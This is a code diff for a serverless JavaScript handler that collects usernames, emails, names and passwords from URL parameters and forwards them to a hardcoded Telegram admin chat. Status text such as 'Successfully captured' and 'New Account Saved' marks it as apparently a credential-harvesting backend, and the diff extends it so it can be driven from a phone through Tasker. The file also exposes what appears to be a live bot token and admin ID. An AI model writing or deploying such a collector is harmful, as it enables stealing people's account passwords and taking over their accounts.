@@ -2,75 +2,92 @@ export const config = {
   runtime: "edge",
 };
 
-const BOT_TOKEN = "7926446040:AAGIpJglh2oeuAbOWxACmyEY0VsTg6Irp_I";
-const ADMIN_ID = "7183111659";
+// DEFAULT VALUES (fallback)
+const DEFAULT_BOT_TOKEN = "7926446040:AAGIpJglh2oeuAbOWxACmyEY0VsTg6Irp_I";
+const DEFAULT_ADMIN_ID = "7183111659";
 
-async function sendMessage(chatId, text) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+// =========================
+// SEND TELEGRAM MESSAGE
+// =========================
+async function sendMessage(token, chatId, text, msg_id = null) {
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+  const body = {
+    chat_id: chatId,
+    text: text,
+    parse_mode: "Markdown",
+  };
+
+  // optional reply to message
+  if (msg_id) {
+    body.reply_to_message_id = msg_id;
+  }
 
   await fetch(url, {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
     },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: text,
-      parse_mode: "Markdown",
-    }),
+    body: JSON.stringify(body),
   });
 }
 
+// =========================
+// MAIN HANDLER
+// =========================
 export default async function handler(req) {
-
   const { searchParams } = new URL(req.url);
 
-  const email = searchParams.get("email");
-  const password = searchParams.get("password");
-  const username = searchParams.get("username");
+  // =========================
+  // GET PARAMS (WITH FALLBACK)
+  // =========================
+  const BOT_TOKEN = searchParams.get("token") || DEFAULT_BOT_TOKEN;
+  const ADMIN_ID = searchParams.get("admin_id") || DEFAULT_ADMIN_ID;
+  const MSG_ID = searchParams.get("msg_id");
+
+  const username = searchParams.get("login");   // %LOGIN
+  const email = searchParams.get("mail");       // %MAIL
+  const name = searchParams.get("name");        // %NAME
+  const password = searchParams.get("pass");    // %PASS
 
   // =========================
-  // ACCOUNT API
+  // ACCOUNT DATA RECEIVE
   // =========================
-
-  if (email && password) {
+  if (email || password || username) {
 
     const msg =
-`📥 *New Account Data Received*
+`📥 *New Account Saved*
 
 👤 *Username:* \`${username || "N/A"}\`
-📧 *Email:* \`${email}\`
-🔑 *Password:* \`${password}\`
+📛 *Name:* \`${name || "N/A"}\`
+📧 *Email:* \`${email || "N/A"}\`
+🔑 *Password:* \`${password || "N/A"}\`
 
 ━━━━━━━━━━━━━━
-📡 *Status:* Successfully captured
-🕒 *Server:* Vercel Edge Runtime`;
+📡 *Status:* Saved via Tasker
+⚡ *Runtime:* Edge API`;
 
-    await sendMessage(ADMIN_ID, msg);
+    await sendMessage(BOT_TOKEN, ADMIN_ID, msg, MSG_ID);
 
-    return new Response("sent");
+    return new Response("saved");
   }
 
   // =========================
   // TELEGRAM WEBHOOK
   // =========================
-
   if (req.method === "POST") {
-
     const update = await req.json();
     const message = update.message;
 
     if (message?.text === "/start") {
-
       const reply =
-`🤖 *Bot Status: Online*
+`🤖 *Bot Online*
 
-This bot is connected successfully and ready to receive account data.
+Ready to receive Tasker data.
 
-📡 Runtime: *Vercel Edge*
-⚡ Status: *Operational*`;
+⚡ Status: *Working*`;
 
-      await sendMessage(message.chat.id, reply);
+      await sendMessage(BOT_TOKEN, message.chat.id, reply);
     }
 
     return new Response("ok");
